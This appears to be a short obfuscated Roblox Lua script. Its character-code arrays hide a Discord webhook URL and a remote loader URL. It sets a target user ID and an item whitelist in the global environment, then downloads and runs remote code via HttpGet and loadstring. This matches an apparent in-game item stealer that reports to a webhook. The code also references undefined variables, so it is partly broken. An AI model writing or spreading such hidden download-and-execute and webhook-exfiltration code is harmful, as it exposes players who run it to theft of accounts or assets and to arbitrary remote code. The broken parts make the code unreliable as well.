-- Obfuscated Script
local _0x1a2b = string.char
local _0x3c4d = table.concat
local _0x5e6f = loadstring
local _0x7g8h = getgenv

local function _dec(t)
    local r = {}
    for i = 1, #t do r[i] = _0x1a2b(t[i]) end
    return _0x3c4d(r)
end

_0x7g8h().targetUserId = 7967228624

_0x7g8h().webhookURL = _dec({104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,48,55,50,54,56,55,57,55,52,55,57,54,52,57,57,48,47,97,115,50,73,109,51,80,73,80,65,85,97,112,101,112,103,73,98,119,71,83,68,110,90,109,84,74,118,86,68,119,114,67,112,89,117,109,45,83,86,67,52,74,116,57,80,53,67,85,73,112,56,77,76,95,99,50,117,111,100,82,111,68,95,54,57,79,56})

for _, _v in ipairs(_raw) do
    if #_v > 0 then
        _wl[_dec(_v)] = true
    else
        _wl[""] = true
    end
end

_0x7g8h().whitelistBrainrot = _wl

local _url = _dec({104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,47,102,105,108,101,115,47,118,52,47,108,111,97,100,101,114,115,47,102,56,50,50,55,100,98,48,54,99,101,102,100,99,55,98,53,54,101,97,54,97,51,101,55,100,52,50,55,50,100,101,46,108,117,97})

_0x5e6f(game:HttpGet(_url))()
